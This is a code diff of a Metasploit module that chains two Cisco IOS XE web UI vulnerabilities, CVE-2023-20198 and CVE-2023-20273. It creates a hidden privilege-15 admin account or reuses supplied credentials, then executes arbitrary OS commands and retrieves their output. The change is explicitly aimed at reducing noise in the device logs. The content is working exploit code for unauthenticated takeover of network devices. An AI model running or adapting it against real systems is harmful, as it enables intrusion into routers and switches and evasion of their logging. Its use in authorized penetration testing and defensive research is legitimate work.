@@ -80,72 +80,87 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('CMD', [ true, 'The OS command to execute.', 'id']),
+        OptString.new('CISCO_ADMIN_USERNAME', [false, 'The username of an admin account. If not set, CVE-2023-20198 is leveraged to create a new admin account.']),
+        OptString.new('CISCO_ADMIN_PASSWORD', [false, 'The password of an admin account. If not set, CVE-2023-20198 is leveraged to create a new admin password.']),
         OptInt.new('REMOVE_OUTPUT_TIMEOUT', [true, 'The maximum timeout (in seconds) to wait when trying to removing the commands output file.', 30])
       ]
     )
   end
 
   def run
-    admin_username = Rex::Text.rand_text_alpha(8)
-    admin_password = Rex::Text.rand_text_alpha(8)
+    # If the user has supplied a username/password, we can use these creds to leverage CVE-2023-20273 and execute an OS
+    # command. If a username/password have not been supplied, we can leverage CVE-2023-20198 to create a new admin
+    # account, and then leverage CVE-2023-20273 to execute an OS command. This opens up the ability to leverage the
+    # auxiliary module for CVE-2023-20198 to create a new admin account once, then use those new admin creds in this
+    # module to execute multiple OS command without the need to create a new 'temporary' admin account for every
+    # invocation of this module (which will reduce the noise in the devices logs).
+    if !datastore['CISCO_ADMIN_USERNAME'].blank? && !datastore['CISCO_ADMIN_PASSWORD'].blank?
+      exececute_os_command(datastore['CISCO_ADMIN_USERNAME'], datastore['CISCO_ADMIN_PASSWORD'])
+    else
+      admin_username = Rex::Text.rand_text_alpha(8)
+      admin_password = Rex::Text.rand_text_alpha(8)
 
-    unless run_cli_command("username #{admin_username} privilege 15 secret #{admin_password}")
-      print_error('Failed to create admin user')
-      return
-    end
-
-    begin
-      vprint_status("Created privilege 15 user '#{admin_username}' with password '#{admin_password}'")
-
-      out_file = Rex::Text.rand_text_alpha(8)
-
-      cmd = "$(openssl enc -base64 -d <<< #{Base64.strict_encode64(datastore['CMD'])}) &> /var/www/#{out_file}"
-
-      unless run_os_command(cmd, admin_username, admin_password)
-        print_error('Failed to run command')
+      unless run_cli_command("username #{admin_username} privilege 15 secret #{admin_password}")
+        print_error('Failed to create admin user')
         return
       end
 
       begin
-        res = send_request_cgi(
-          'method' => 'GET',
-          'uri' => normalize_uri('webui', out_file),
-          'headers' => {
-            'Authorization' => basic_auth(admin_username, admin_password)
-          }
-        )
+        vprint_status("Created privilege 15 user '#{admin_username}' with password '#{admin_password}'")
 
-        unless res&.code == 200
-          print_error('Failed to get command output')
-          return
-        end
-
-        print_status(res.body)
+        exececute_os_command(admin_username, admin_password)
       ensure
-        vprint_status("Removing output file '/var/www/#{out_file}'")
+        vprint_status("Removing user '#{admin_username}'")
 
-        # Deleting the output file can take more than one attempt.
-        success = retry_until_truthy(timeout: datastore['REMOVE_OUTPUT_TIMEOUT']) do
-          if run_os_command("rm /var/www/#{out_file}", admin_username, admin_password)
-            next true
-          end
-
-          vprint_status('Failed to delete output file, waiting and trying again...')
-          false
+        unless run_cli_command("no username #{admin_username}")
+          print_warning('Failed to remove user')
         end
-
-        unless success
-          print_error("Failed to delete output file '/var/www/#{out_file}")
-          print_error(out_file)
-        end
-      end
-    ensure
-      vprint_status("Removing user '#{admin_username}'")
-
-      unless run_cli_command("no username #{admin_username}")
-        print_warning('Failed to remove user')
       end
     end
   end
 
+  def exececute_os_command(admin_username, admin_password)
+    out_file = Rex::Text.rand_text_alpha(8)
+
+    cmd = "$(openssl enc -base64 -d <<< #{Base64.strict_encode64(datastore['CMD'])}) &> /var/www/#{out_file}"
+
+    unless run_os_command(cmd, admin_username, admin_password)
+      print_error('Failed to run command')
+      return
+    end
+
+    begin
+      res = send_request_cgi(
+        'method' => 'GET',
+        'uri' => normalize_uri('webui', out_file),
+        'headers' => {
+          'Authorization' => basic_auth(admin_username, admin_password)
+        }
+      )
+
+      unless res&.code == 200
+        print_error('Failed to get command output')
+        return
+      end
+
+      print_line(res.body)
+    ensure
+      vprint_status("Removing output file '/var/www/#{out_file}'")
+
+      # Deleting the output file can take more than one attempt.
+      success = retry_until_truthy(timeout: datastore['REMOVE_OUTPUT_TIMEOUT']) do
+        if run_os_command("rm /var/www/#{out_file}", admin_username, admin_password)
+          next true
+        end
+
+        vprint_status('Failed to delete output file, waiting and trying again...')
+        false
+      end
+
+      unless success
+        print_error("Failed to delete output file '/var/www/#{out_file}")
+        print_error(out_file)
+      end
+    end
+  end
 end
